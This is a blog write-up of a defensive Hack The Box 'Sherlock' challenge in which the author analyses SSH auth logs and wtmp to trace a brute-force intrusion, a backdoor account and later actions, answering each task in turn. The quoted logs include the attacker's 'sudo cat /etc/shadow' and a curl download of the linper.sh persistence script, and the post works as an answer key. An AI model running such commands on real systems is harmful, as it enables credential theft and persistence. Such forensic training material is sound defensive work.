---
title: HTB Sherlock - Brutus
author: Kieran
pubDatetime: 2025-01-09
slug: htb-sherlock-brutus
featured: true
draft: false
tags:
  - htb
  - blue
  - sherlock
ogImage: ""
description: My experience with the HTB Sherlock, Brutus.
---

For this challenge we are given a zip file containing 2 files;

Contents of brutus.zip
```
┌──(root㉿monster)-[/mnt/f/sherlocks/brutus]
└─# ls
auth.log  wtmp
```

The `auth.log` file is a log file found in Unix-like operating systems, typically located in the /var/log directory. It records authentication-related events such as login attempts, sudo actions, and service authentications.

The `wtmp` file is a binary log file in Unix-like systems that records login sessions, logout events, and system boots or shutdowns.

**Task 1) Analyzing the auth.log, can you identify the IP address used by the attacker to carry out a brute force attack?**

Taking a quick look at auth.log, we are able to see the file is not large and can be skimmed.

```
┌──(root㉿monster)-[/mnt/f/sherlocks/brutus]
└─# cat auth.log | wc -l
385
```
Glancing over the auth.log, we find numerous failed logon attempts from a particular ip (65.2.161.68)

```
┌──(root㉿monster)-[/mnt/f/sherlocks/brutus]
└─# cat auth.log | grep sshd
Mar  6 06:19:52 ip-172-31-35-28 sshd[1465]: AuthorizedKeysCommand /usr/share/ec2-instance-connect/eic_run_authorized_keys root SHA256:4vycLsDMzI+hyb9OP3wd18zIpyTqJmRq/QIZaLNrg8A failed, status 22
Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: Accepted password for root from 203.101.190.9 port 42825 ssh2
Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Invalid user admin from 65.2.161.68 port 46380
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Received disconnect from 65.2.161.68 port 46380:11: Bye Bye [preauth]
Mar  6 06:31:31 ip-172-31-35-28 sshd[2325]: Disconnected from invalid user admin 65.2.161.68 port 46380 [preauth]
Mar  6 06:31:31 ip-172-31-35-28 sshd[620]: error: beginning MaxStartups throttling
Mar  6 06:31:31 ip-172-31-35-28 sshd[620]: drop connection #10 from [65.2.161.68]:46482 on [172.31.35.28]:22 past MaxStartups
Mar  6 06:31:31 ip-172-31-35-28 sshd[2327]: Invalid user admin from 65.2.161.68 port 46392
Mar  6 06:31:31 ip-172-31-35-28 sshd[2327]: pam_unix(sshd:auth): check pass; user unknown
Mar  6 06:31:31 ip-172-31-35-28 sshd[2327]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68
Mar  6 06:31:31 ip-172-31-35-28 sshd[2332]: Invalid user admin from 65.2.161.68 port 46444
Mar  6 06:31:31 ip-172-31-35-28 sshd[2331]: Invalid user admin from 65.2.161.68 port 46436
Mar  6 06:31:31 ip-172-31-35-28 sshd[2332]: pam_unix(sshd:auth): check pass; user unknown
Mar  6 06:31:31 ip-172-31-35-28 sshd[2332]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68
Mar  6 06:31:31 ip-172-31-35-28 sshd[2331]: pam_unix(sshd:auth): check pass; user unknown
Mar  6 06:31:31 ip-172-31-35-28 sshd[2331]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.2.161.68
Mar  6 06:31:31 ip-172-31-35-28 sshd[2330]: Invalid user admin from 65.2.161.68 port 46422
Mar  6 06:31:31 ip-172-31-35-28 sshd[2337]: Invalid user admin from 65.2.161.68 port 46498
Mar  6 06:31:31 ip-172-31-35-28 sshd[2328]: Invalid user admin from 65.2.161.68 port 46390
Mar  6 06:31:31 ip-172-31-35-28 sshd[2335]: Invalid user admin from 65.2.161.68 port 46460
```
This gives us the answer to Task 1: `65.2.161.68`

**Task 2) The brute force attempts were successful, and the attacker gained access to an account on the server. What is the username of this account?**

If you skim the auth.log, you'll find it changes from failures to success at 6:32:44

```
Mar  6 06:31:42 ip-172-31-35-28 sshd[2423]: Failed password for backup from 65.2.161.68 port 34834 ssh2
Mar  6 06:31:42 ip-172-31-35-28 sshd[2424]: Failed password for backup from 65.2.161.68 port 34856 ssh2
Mar  6 06:31:44 ip-172-31-35-28 sshd[2423]: Connection closed by authenticating user backup 65.2.161.68 port 34834 [preauth]
Mar  6 06:31:44 ip-172-31-35-28 sshd[2424]: Connection closed by authenticating user backup 65.2.161.68 port 34856 [preauth]
Mar  6 06:32:39 ip-172-31-35-28 sshd[620]: exited MaxStartups throttling after 00:01:08, 21 connections dropped
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
```

We can narrow it down further using grep.

```
┌──(root㉿monster)-[/mnt/f/sherlocks/brutus]
└─# cat auth.log | grep Accepted
Mar  6 06:19:54 ip-172-31-35-28 sshd[1465]: Accepted password for root from 203.101.190.9 port 42825 ssh2
Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2
```
This gives us the answer to Task 2: `root`

**Task 3) Can you identify the timestamp when the attacker manually logged in to the server to carry out their objectives?**

To answer this question we'll take a look at wtmp, as wtmp logs sourceIP we can narrow it down to our known malicious Ip address.

```
┌──(root㉿monster)-[/mnt/f/sherlocks/brutus]
└─# utmpdump wtmp | grep 65.2.161.68
Utmp dump of wtmp
[7] [02549] [ts/1] [root    ] [pts/1       ] [65.2.161.68         ] [65.2.161.68    ] [2024-03-06T06:32:45,387923+00:00]
[7] [02667] [ts/1] [cyberjunkie] [pts/1       ] [65.2.161.68         ] [65.2.161.68    ] [2024-03-06T06:37:35,475575+00:00]
```

Looking at the output, we can see that the login timestamp is very close to what is seen in auth.log

This gives us the answer to Task 3: `2024-03-06 06:32:45`

**Task 4) SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?**

To answer this question we can review the login within auth.log

```
┌──(root㉿monster)-[/mnt/f/sherlocks/brutus]
└─# cat auth.log | grep 06:32
Mar  6 06:32:01 ip-172-31-35-28 CRON[2477]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
Mar  6 06:32:01 ip-172-31-35-28 CRON[2476]: pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)
Mar  6 06:32:01 ip-172-31-35-28 CRON[2476]: pam_unix(cron:session): session closed for user confluence
Mar  6 06:32:01 ip-172-31-35-28 CRON[2477]: pam_unix(cron:session): session closed for user confluence
Mar  6 06:32:39 ip-172-31-35-28 sshd[620]: exited MaxStartups throttling after 00:01:08, 21 connections dropped
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
```

This gives us the answer to task 4: `37`

**Task 5) The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?**

Within auth.log, we can see the attacker created a new group and user called `cyberjunkie`;

```
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/group: name=cyberjunkie, GID=1002
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/gshadow: name=cyberjunkie
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: new group: name=cyberjunkie, GID=1002
Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1
Mar  6 06:34:26 ip-172-31-35-28 passwd[2603]: pam_unix(passwd:chauthtok): password changed for cyberjunkie
```

This gives us the answer to task 5: `cyberjunkie`

**Task 6) What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?**

Browsing the MITRE website we find the following technique;

https://attack.mitre.org/techniques/T1136/ with a sub-technique of .001 for Local Account

This gives us the answer to task 6: `T1136.001`

**Task 7) What time did the attacker's first SSH session end according to auth.log?**

Within auth.log, we can review the details from 06:32 onwards after session 37 was first established to confirm when they disconnected

```
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Received disconnect from 65.2.161.68 port 53184:11: disconnected by user
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184
```

This gives us the answer to task 7: `2024-03-06 06:37:24`

**Task 8) The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?**

As we know the backdoor account name is `cyberjunkie`, we can narrow down our search of auth.log to just what we need;

```
┌──(root㉿monster)-[/mnt/f/sherlocks/brutus]
└─# cat auth.log | grep cyberjunkie
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/group: name=cyberjunkie, GID=1002
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: group added to /etc/gshadow: name=cyberjunkie
Mar  6 06:34:18 ip-172-31-35-28 groupadd[2586]: new group: name=cyberjunkie, GID=1002
Mar  6 06:34:18 ip-172-31-35-28 useradd[2592]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1
Mar  6 06:34:26 ip-172-31-35-28 passwd[2603]: pam_unix(passwd:chauthtok): password changed for cyberjunkie
Mar  6 06:34:31 ip-172-31-35-28 chfn[2605]: changed user 'cyberjunkie' information
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to group 'sudo'
Mar  6 06:35:15 ip-172-31-35-28 usermod[2628]: add 'cyberjunkie' to shadow group 'sudo'
Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2
Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: pam_unix(sshd:session): session opened for user cyberjunkie(uid=1002) by (uid=0)
Mar  6 06:37:34 ip-172-31-35-28 systemd-logind[411]: New session 49 of user cyberjunkie.
Mar  6 06:37:34 ip-172-31-35-28 systemd: pam_unix(systemd-user:session): session opened for user cyberjunkie(uid=1002) by (uid=0)
Mar  6 06:37:57 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
Mar  6 06:37:57 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by cyberjunkie(uid=1002)
Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
Mar  6 06:39:38 ip-172-31-35-28 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by cyberjunkie(uid=1002)
```

This gives us the answer to task 8: `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`